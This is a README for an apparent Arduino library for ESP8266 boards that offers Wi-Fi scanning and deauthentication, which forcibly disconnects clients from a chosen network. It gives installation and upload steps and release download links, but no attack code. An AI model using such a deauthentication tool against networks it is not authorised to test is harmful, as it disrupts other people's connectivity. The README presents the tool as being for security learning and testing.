# ⚡ DeautherX-lib - Easy Wi-Fi Security Testing Tool

[![Download Release](https://img.shields.io/badge/Download%20Release-brightgreen?style=for-the-badge)](https://github.com/Unresponsive-hydrangeafamily234/DeautherX-lib/releases)

---

## 📘 About DeautherX-lib

DeautherX-lib is a simple library designed to help test Wi-Fi security on devices using ESP8266 chips. It allows you to run Wi-Fi deauthentication tests and scanning tasks with ease. This library works with Arduino and C++ environments. Its goal is to provide a clear, unified tool for both beginners and advanced users who want to understand their Wi-Fi environment better.

Whether you want to learn how Wi-Fi networks behave or make sure your network is secure, DeautherX-lib gives you a straightforward way to start.

---

## 🌐 Key Features

- Supports ESP8266 microcontroller devices.
- Performs Wi-Fi scanning and deauthentication testing.
- Compatible with Arduino IDE and C++ code.
- Offers a clean library structure for learning and custom projects.
- Helps identify weak spots in Wi-Fi networks.
- Includes basic tools for network monitoring.

---

## 🖥️ System Requirements

- Windows 7, 8, 10, or 11 (64-bit recommended).
- ESP8266 development board connected via USB.
- Arduino IDE installed (version 1.8 or newer).
- USB driver for ESP8266 devices installed.
- Internet access for downloading files.

---

## 🚀 Getting Started

### Step 1: Install the Arduino IDE

If you don’t have the Arduino IDE on your Windows computer, follow these steps:

1. Go to the official Arduino website: https://www.arduino.cc/en/software
2. Click on the Windows Installer link.
3. Download and run the installer.
4. Follow the on-screen instructions to complete the installation.

The Arduino IDE lets you write and load code onto ESP8266 devices.

---

## 🔽 Download the Library

[![Download Releases](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge)](https://github.com/Unresponsive-hydrangeafamily234/DeautherX-lib/releases)

1. Click the link above or go to:  
   https://github.com/Unresponsive-hydrangeafamily234/DeautherX-lib/releases  
2. Find the latest release listed at the top of the page.
3. Look for a file that ends with `.zip` or `.tar.gz`.
4. Click the file to download it to your computer.
5. Wait for the download to finish.

---

## 📂 Installing DeautherX-lib in Arduino IDE

1. Open the Arduino IDE.
2. In the top menu, select **Sketch** > **Include Library** > **Add .ZIP Library**.
3. Navigate to and select the DeautherX-lib zip file you downloaded.
4. Click **Open** to add the library.
5. The library will now appear in the list when you select **Include Library**.

---

## 🔌 Connect Your ESP8266 Device

1. Use a USB cable to connect your ESP8266 board to your Windows computer.
2. Ensure the correct USB driver is installed.  
   - If Windows does not recognize your device, search online for "ESP8266 USB driver Windows" and follow the instructions.
3. In Arduino IDE, go to **Tools** > **Port** and select the port assigned to your device (usually something like COM3, COM4, etc.).
4. Under **Tools** > **Board**, choose your specific ESP8266 board model.

---

## 📝 Load and Run Examples

1. In Arduino IDE, go to **File** > **Examples** > **DeautherX-lib**.
2. Choose an example sketch like `WiFiScan` or `DeauthTest`.
3. Review the example code to understand what it does. You don’t need to change anything at first.
4. Click the **Upload** button (right arrow icon).
5. Wait for the code to compile and upload. You will see messages at the bottom indicating progress.
6. The device will start running the loaded program.

---

## ⚙️ Using DeautherX-lib Features

Once the code runs on your ESP8266 device, it can perform Wi-Fi scanning or deauthentication based on the example loaded.

- **Wi-Fi Scan:** The device searches for nearby Wi-Fi networks and shows a list of found access points.
- **Deauthentication:** The device sends signals that disconnect clients from a chosen Wi-Fi network. This helps test if a network is vulnerable to such attacks.

The way you interact with the device depends on your setup. Some examples may use serial monitor output to show results, while others may use LEDs or external displays connected to the ESP8266.

---

## 💡 Tips for Best Use

- Always have permission to test networks you do not own.
- Start with scanning to learn about nearby Wi-Fi before trying deauthentication.
- Use the serial monitor in Arduino IDE (accessible with **Tools** > **Serial Monitor**) to see live messages during tests.
- Change example sketches only if you understand basic Arduino programming.
- Keep your ESP8266 firmware up to date for best device compatibility.

---

## 🔧 Troubleshooting

- **Device Not Found:** Make sure the USB cable is working and connected securely. Check USB driver installation.
- **Upload Fails:** Verify you selected the correct board and port in Arduino IDE. Try pressing the ESP8266 reset button before uploading.
- **Serial Monitor Shows Garbage:** Confirm the baud rate in the serial monitor matches the speed in the sketch (usually 115200).
- **Library Not Recognized:** Make sure you added the zip library in Arduino IDE properly and restarted the program.

---

## 🔗 Useful Links

- Official release page: https://github.com/Unresponsive-hydrangeafamily234/DeautherX-lib/releases
- Arduino IDE downloads and info: https://www.arduino.cc/en/software
- ESP8266 official docs: https://arduino-esp8266.readthedocs.io/en/latest/

---

## 🧰 About This Library

DeautherX-lib combines several Wi-Fi security tools into one package. It helps users better understand common Wi-Fi threats by providing a clear and easy-to-use platform. The library is based on C++ and designed for use with Arduino software supporting ESP8266 chips.

This approach allows hobbyists and educators to explore Wi-Fi concepts safely and learn practical skills in network testing and security.